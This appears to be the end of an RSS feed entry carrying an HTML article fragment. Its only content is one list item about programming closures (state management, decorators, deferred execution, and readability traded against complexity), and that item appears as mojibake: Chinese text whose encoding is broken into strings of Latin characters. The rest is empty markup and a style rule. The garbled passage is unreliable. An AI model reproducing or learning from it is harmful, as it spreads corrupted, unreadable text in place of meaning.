<li>é—­åŒ…é€‚ç”¨äºè½»é‡çº§çŠ¶æ€ç®¡ç†ã€è£…é¥°å™¨å®ç°ã€å»¶è¿Ÿæ‰§è¡Œç­‰åœºæ™¯ï¼Œæ˜¯å‡½æ•°å¼ç¼–ç¨‹çš„é‡è¦å·¥å…·ï¼Œä½†å…¶å¯è¯»æ€§éœ€ä¸å¤æ‚åº¦æƒè¡¡</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>